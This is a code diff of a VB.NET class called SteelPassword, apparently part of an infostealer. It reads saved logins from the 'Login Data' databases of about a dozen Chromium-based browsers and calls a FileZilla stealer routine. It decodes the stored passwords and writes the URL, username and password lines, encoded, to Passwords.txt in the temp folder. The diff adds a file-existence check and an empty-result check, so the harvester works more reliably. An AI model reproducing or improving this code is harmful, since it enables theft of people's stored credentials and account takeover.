@@ -7,13 +7,13 @@ Public Class SteelPassword
     Dim Data As String
     Public a As String
     Public Paths As String = IO.Path.GetTempPath & "/"
-
     Public Function Dump()
         Try
             Dim TextBox1 As New TextBox
             TextBox1.Multiline = True
             FileZillaStealer()
-            Dim ChromiumPaths As String() = {"Google\Chrome\User Data\Default\Login Data",
+            Dim ChromiumPaths As String() = {
+                                "Google\Chrome\User Data\Default\Login Data",
                                 "Vivaldi\\User Data\Default\Login Data",
                                 "Chromium\User Data\Default\Login Data",
                                 "Torch\User Data\Default\Login Data",
@@ -23,32 +23,41 @@ Public Class SteelPassword
                                 "Kometa\User Data\Default\Login Data",
                                 "Amigo\User Data\Default\Login Data",
                                 "Nichrome\\User Data\Default\Login Data",
-                                "BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
+                                "BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+                            }
             For Each ChromiumPath As String In ChromiumPaths
-                Try
-                    Dim loginPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ChromiumPath)
-                    Dim sb As New StringBuilder
-                    Dim sqlDataBase As New SqLiteHandler(loginPath)
-                    sqlDataBase.ReadTable("logins")
-                    Dim count As Integer = sqlDataBase.GetRowCount()
-                    For i = 0 To count - 1
-                        Dim mUrl As String = sqlDataBase.GetValue(i, "origin_url")
-                        Dim mUserName As String = sqlDataBase.GetValue(i, "username_value")
-                        Dim mPassword As String = Decode(sqlDataBase.GetValue(i, "password_value"))
-                        If (mUserName = "" Or mPassword = "") Then
+                If File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ChromiumPath)) Then
+                    Try
+                        Dim loginPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ChromiumPath)
+                        Dim sb As New StringBuilder
+                        Dim sqlDataBase As New SqLiteHandler(loginPath)
+                        sqlDataBase.ReadTable("logins")
+                        Dim count As Integer = sqlDataBase.GetRowCount()
+                        For i = 0 To count - 1
+                            Dim mUrl As String = sqlDataBase.GetValue(i, "origin_url")
+                            Dim mUserName As String = sqlDataBase.GetValue(i, "username_value")
+                            Dim mPassword As String = Decode(sqlDataBase.GetValue(i, "password_value"))
+                            If (mUserName = "" Or mPassword = "") Then
 
-                        Else
-                            TextBox1.AppendText(mUrl & "," & mUserName & "," & mPassword & vbNewLine)
-                        End If
-                    Next i
-                Catch ex As Exception
+                            Else
+                                TextBox1.AppendText(mUrl & "," & mUserName & "," & mPassword & vbNewLine)
+                            End If
+                        Next i
+                    Catch ex As Exception
 
-                End Try
+                    End Try
+                Else
+
+                End If
             Next
             If Not (Data = "") Then
                 TextBox1.AppendText(ENB(Data))
             End If
-            IO.File.WriteAllText(Paths & "Passwords.txt", ENB(TextBox1.Text))
+            If TextBox1.Text = "" Then
+                Return False
+            Else
+                IO.File.WriteAllText(Paths & "Passwords.txt", ENB(TextBox1.Text))
+            End If
             Return True
         Catch ex As Exception
             Return False
